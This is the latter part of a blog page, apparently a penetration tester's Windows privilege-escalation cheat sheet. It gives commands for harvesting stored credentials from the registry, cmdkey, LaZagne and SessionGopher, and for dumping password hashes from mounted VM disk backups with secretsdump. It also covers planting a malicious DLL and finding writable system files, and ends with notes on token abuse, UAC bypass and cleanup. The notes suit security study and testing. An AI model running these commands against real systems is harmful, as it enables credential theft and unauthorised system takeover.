+<h2 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h2><h3 id="User-Description-Fields"><a href="#User-Description-Fields" class="headerlink" title="User Description Fields"></a>User Description Fields</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check local user descriptions</span></span><br><span class="line"><span class="built_in">Get-LocalUser</span> | <span class="built_in">select</span> Name,Description</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check computer description</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_OperatingSystem | <span class="built_in">select</span> Description</span><br></pre></td></tr></table></figure>
+
+<h3 id="Registry-Credentials"><a href="#Registry-Credentials" class="headerlink" title="Registry Credentials"></a>Registry Credentials</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Autologon credentials</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line"># VNC passwords</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"></span><br><span class="line"># Putty sessions</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Saved-Credentials"><a href="#Saved-Credentials" class="headerlink" title="Saved Credentials"></a>Saved Credentials</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># List saved credentials</span><br><span class="line">cmdkey /list</span><br><span class="line"></span><br><span class="line"># Use saved credentials</span><br><span class="line">runas /savecred /user:DOMAIN\admin &quot;<span class="built_in">cmd</span>.exe /c whoami &gt; C:\Users\Public\out.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LaZagne-Password-Recovery"><a href="#LaZagne-Password-Recovery" class="headerlink" title="LaZagne (Password Recovery)"></a>LaZagne (Password Recovery)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Run all modules</span><br><span class="line">.\lazagne.exe all</span><br><span class="line"></span><br><span class="line"># Run specific module</span><br><span class="line">.\lazagne.exe browsers</span><br></pre></td></tr></table></figure>
+
+<h3 id="SessionGopher-Saved-Sessions"><a href="#SessionGopher-Saved-Sessions" class="headerlink" title="SessionGopher (Saved Sessions)"></a>SessionGopher (Saved Sessions)</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\SessionGopher.ps1</span><br><span class="line"><span class="built_in">Invoke-SessionGopher</span> <span class="literal">-Thorough</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Virtual-Disk-Files"><a href="#Virtual-Disk-Files" class="headerlink" title="Virtual Disk Files"></a>Virtual Disk Files</h2><h3 id="Mount-VHDX-on-Windows"><a href="#Mount-VHDX-on-Windows" class="headerlink" title="Mount VHDX on Windows"></a>Mount VHDX on Windows</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Mount VHDX file</span></span><br><span class="line"><span class="built_in">Mount-VHD</span> <span class="literal">-Path</span> C:\Backups\DC01.vhdx</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or right-click file and select &quot;Mount&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Mount-VMDK-on-Linux"><a href="#Mount-VMDK-on-Linux" class="headerlink" title="Mount VMDK on Linux"></a>Mount VMDK on Linux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Mount VMDK</span></span><br><span class="line">guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount VHDX</span></span><br><span class="line">guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Extract-Hashes-from-Mounted-Disk"><a href="#Extract-Hashes-from-Mounted-Disk" class="headerlink" title="Extract Hashes from Mounted Disk"></a>Extract Hashes from Mounted Disk</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Copy registry hives</span></span><br><span class="line"><span class="built_in">cp</span> /mnt/vmdk/Windows/System32/config/SAM .</span><br><span class="line"><span class="built_in">cp</span> /mnt/vmdk/Windows/System32/config/SYSTEM .</span><br><span class="line"><span class="built_in">cp</span> /mnt/vmdk/Windows/System32/config/SECURITY .</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract hashes</span></span><br><span class="line">secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
+
+<h2 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h2><h3 id="Named-Pipes"><a href="#Named-Pipes" class="headerlink" title="Named Pipes"></a>Named Pipes</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># List named pipes</span><br><span class="line">.\pipelist.exe</span><br><span class="line"></span><br><span class="line"># Check pipe permissions</span><br><span class="line">.\accesschk.exe -w \pipe\* -v</span><br></pre></td></tr></table></figure>
+
+<h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">Find</span> missing DLLs</span><br><span class="line">.\procmon.exe</span><br><span class="line"></span><br><span class="line"># Check write permissions on application directory</span><br><span class="line">.\accesschk64.exe /accepteula -quvw &quot;C:\Program Files\Application\&quot;</span><br><span class="line"></span><br><span class="line"># Place malicious DLL</span><br><span class="line"><span class="built_in">copy</span> evil.dll &quot;C:\Program Files\Application\missing.dll&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Insecure-File-Permissions"><a href="#Insecure-File-Permissions" class="headerlink" title="Insecure File Permissions"></a>Insecure File Permissions</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">Find</span> writable files <span class="keyword">in</span> Program Files</span><br><span class="line">.\accesschk64.exe /accepteula -quvws &quot;Everyone&quot; &quot;C:\Program Files&quot;</span><br><span class="line"></span><br><span class="line"># <span class="built_in">Find</span> writable system files</span><br><span class="line">.\accesschk64.exe /accepteula -quvws &quot;Authenticated Users&quot; &quot;C:\Windows&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>Token Privileges:</strong></p>
+<ul>
+<li>SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege are commonly found on service accounts (IIS, SQL Server, etc.)</li>
+<li>These privileges allow impersonating other users’ security contexts</li>
+<li>Potato exploits abuse NTLM authentication and RPC&#x2F;DCOM to escalate to SYSTEM</li>
+</ul>
+<p><strong>UAC Bypass Limitations:</strong></p>
+<ul>
+<li>UAC bypasses only work if you’re already in the Administrators group</li>
+<li>They elevate from medium integrity to high integrity (same user, elevated token)</li>
+<li>Do not grant new privileges beyond what the account already has</li>
+<li>Most bypasses rely on auto-elevating Windows binaries and registry hijacking</li>
+</ul>
+<p><strong>Service Exploitation:</strong></p>
+<ul>
+<li>Always check if you can restart services before exploiting them</li>
+<li>Some services run on boot only</li>
+<li>Modifying critical services can cause system instability</li>
+</ul>
+<p><strong>Kernel Exploits:</strong></p>
+<ul>
+<li>Use as last resort due to system crash risk</li>
+<li>Always test in lab environment first</li>
+<li>Ensure you have a backup&#x2F;snapshot before attempting</li>
+</ul>
+<p><strong>Group Memberships:</strong></p>
+<ul>
+<li>DNS Admins, Backup Operators, Print Operators, Server Operators, and Hyper-V Administrators are high-value groups</li>
+<li>These groups have privileges that can be abused for privilege escalation</li>
+<li>Always enumerate group memberships during initial access</li>
+</ul>
+<p><strong>Virtual Disks:</strong></p>
+<ul>
+<li>VHDX, VHD, and VMDK files often contain backups of production systems</li>
+<li>Can extract SAM&#x2F;SYSTEM hives for offline hash cracking</li>
+<li>May contain credentials, SSH keys, or other sensitive data</li>
+</ul>
+<p><strong>Cleanup:</strong></p>
+<ul>
+<li>Always remove malicious DLLs, registry keys, and user accounts after testing</li>
+<li>Document all changes made during privilege escalation</li>
+<li>Restore service configurations to original state</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
